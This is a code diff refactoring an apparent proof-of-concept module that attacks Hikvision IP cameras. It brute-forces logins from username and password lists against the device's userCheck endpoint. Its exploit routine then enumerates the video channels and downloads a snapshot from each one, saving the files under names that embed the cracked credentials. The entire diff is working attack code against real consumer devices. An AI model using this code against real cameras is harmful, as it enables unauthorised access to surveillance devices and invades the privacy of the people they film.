@@ -2,64 +2,34 @@ import requests
 from requests.auth import HTTPDigestAuth
 from xml.etree import ElementTree
 
-from loguru import logger
-
-from .base import POCTemplate
+from .base import WeakPasswordPOC
 
 
-class HikvisionWeakPassword(POCTemplate):
+class HikvisionWeakPassword(WeakPasswordPOC):
+    product_key = 'hikvision'
 
-    def __init__(self, config):
-        super().__init__(config)
-        self.name = self.get_file_name(__file__)
-        self.product = config.product['hikvision']
-        self.product_version = ''
-        self.ref = ''
-        self.level = POCTemplate.level.medium
-        self.desc = """"""
-        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
-
-    def verify(self, ip, port=80):
-        for user in self.config.users:
-            for password in self.config.passwords:
-                try:
-                    r = requests.get(
-                        url=f"http://{ip}:{port}/ISAPI/Security/userCheck",
-                        auth=(user, password),
-                        timeout=self.config.timeout,
-                        headers=self.headers,
-                        verify=False
-                    )
-                    if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
-                        return ip, str(port), self.product, str(user), str(password), self.name
-                except Exception as e:
-                    logger.error(e)
-        return None
+    def _check(self, ip, port, user, password):
+        r = requests.get(f"http://{ip}:{port}/ISAPI/Security/userCheck",
+                         auth=(user, password), headers=self.headers,
+                         timeout=self.config.timeout, verify=False)
+        return (r.status_code == 200
+                and 'userCheck' in r.text
+                and 'statusValue' in r.text
+                and '200' in r.text)
 
     def exploit(self, results):
-        ip, port, product, user, password, vul = results
+        ip, port, _, user, password, _ = results
         channels = 1
         try:
-            res = requests.get(
-                f"http://{ip}:{port}/ISAPI/Image/channels",
-                auth=HTTPDigestAuth(user, password),
-                headers=self.headers,
-                timeout=self.config.timeout,
-                verify=False
-            )
+            res = requests.get(f"http://{ip}:{port}/ISAPI/Image/channels",
+                               auth=HTTPDigestAuth(user, password), headers=self.headers,
+                               timeout=self.config.timeout, verify=False)
             channels = len(ElementTree.fromstring(res.text))
-        except Exception as e:
-            logger.error(e)
-
-        # 获取每个通道的图片
+        except Exception:
+            pass
         res_list = []
-        for channel in range(1, channels + 1):
-            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{channel}01/picture"
-            img_file_name = f"{ip}-{port}-channel{channel}-{user}-{password}.jpg"
-            res_list.append(
-                self._snapshot(url, img_file_name, auth=HTTPDigestAuth(user, password))
-            )
+        for ch in range(1, channels + 1):
+            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{ch}01/picture"
+            res_list.append(self._snapshot(url, f"{ip}-{port}-channel{ch}-{user}-{password}.jpg",
+                                           auth=HTTPDigestAuth(user, password)))
         return sum(res_list)
-
-
-POCTemplate.register_poc(HikvisionWeakPassword)
